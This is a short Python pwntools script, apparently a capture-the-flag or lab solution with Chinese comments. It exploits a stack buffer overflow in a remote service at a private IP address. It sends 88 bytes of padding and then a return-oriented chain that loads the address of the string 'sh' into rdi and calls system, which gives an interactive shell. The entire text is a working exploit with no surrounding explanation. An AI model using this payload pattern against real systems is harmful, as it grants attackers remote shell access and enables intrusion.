#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'amd64', os = 'linux', timeout = 1)
io = remote('192.168.80.132', 30001)

call_system = 0x40075f			#call system指令在内存中的位置
binsh = 0x4003ef			#字符串"sh"在内存中的位置
pop_rdi = 0x400883			#pop rdi; retn

payload = ""
payload += "A"*88			#padding
payload += p64(pop_rdi)		
payload += p64(binsh)		#rdi指向字符串"sh"
payload += p64(call_system)		#调用system执行system("sh")

io.sendline(payload)
io.interactive()